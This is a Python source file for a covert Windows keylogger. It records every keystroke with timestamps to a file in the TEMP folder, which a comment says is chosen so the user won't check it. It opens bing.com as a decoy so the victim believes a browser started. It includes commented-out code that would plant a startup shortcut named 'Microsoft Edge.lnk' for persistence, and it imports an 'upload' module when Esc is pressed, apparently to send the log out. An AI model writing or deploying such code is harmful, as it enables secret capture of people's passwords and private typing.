from pynput import keyboard as kb
import logging
import webbrowser
import os
import sys
import winshell
from win32com.client import Dispatch

# # Path to the Python script
# # path = os.path.abspath(sys.argv[0])

# # Create a shortcut to the Python script
# # shortcut = os.path.join(winshell.startup(), "Microsoft Edge.lnk")
# # shell = Dispatch('WScript.Shell')
# # shortcut = shell.CreateShortCut(shortcut)
# # shortcut.Targetpath = path
# # shortcut.WorkingDirectory = os.path.dirname(path)
# # shortcut.IconLocation = path
# # shortcut.save()

# Opens the browser as the user suspects
webbrowser.open_new_tab('bing.com')

log_file = os.path.join(os.environ.get('TEMP'),"keylog.txt")
f = open(log_file, "a")
f.write("Start logging...\n")
f.close()

#Hides the file somewhere the user probably won't check


with open(log_file, 'w+') as file:
    lines = file.readlines()
    num_lines = len(lines)
    if(num_lines > 100):
        file.truncate(0)


def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        if(key == kb.Key.esc):
            import upload
        logging.info(key)

logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Set up the listener
with kb.Listener(on_press=on_press) as listener:
    listener.join()
